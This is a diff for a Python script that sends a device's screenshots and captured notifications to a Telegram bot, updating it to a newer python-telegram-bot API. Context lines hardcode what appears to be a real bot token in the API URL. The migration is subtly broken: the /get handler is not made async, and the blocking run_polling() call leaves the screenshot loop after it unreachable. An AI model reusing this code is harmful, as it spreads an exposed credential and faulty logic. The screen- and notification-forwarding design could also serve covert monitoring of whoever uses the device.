@@ -4,7 +4,7 @@ import requests
 import subprocess
 from datetime import datetime
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
+from telegram.ext import Application, CommandHandler, ContextTypes
 
 # Telegram Bot API settings
 TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
@@ -68,7 +68,7 @@ def update_sent_screenshots(screenshot_path):
     with open(LOG_FILE, 'a') as f:
         f.write(screenshot_path + "\n")
 
-def handle_get_command(update: Update, context: CallbackContext):
+def handle_get_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Send all screenshots again when the /get command is received."""
     screenshots = get_screenshots()
     if screenshots:
@@ -97,15 +97,14 @@ def capture_notifications():
         print(f"Error capturing notifications: {e.output.decode()}")
 
 def main():
-    # Start the Telegram bot
-    updater = Updater(token=BOT_TOKEN, use_context=True)
-    dispatcher = updater.dispatcher
+    # Create the application instance using the bot token
+    application = Application.builder().token(BOT_TOKEN).build()
 
     # Add /get command handler
-    dispatcher.add_handler(CommandHandler("get", handle_get_command))
+    application.add_handler(CommandHandler("get", handle_get_command))
 
-    # Start polling for Telegram commands
-    updater.start_polling()
+    # Start the Telegram bot
+    application.run_polling()
 
     sent_screenshots = get_sent_screenshots()
     while True:
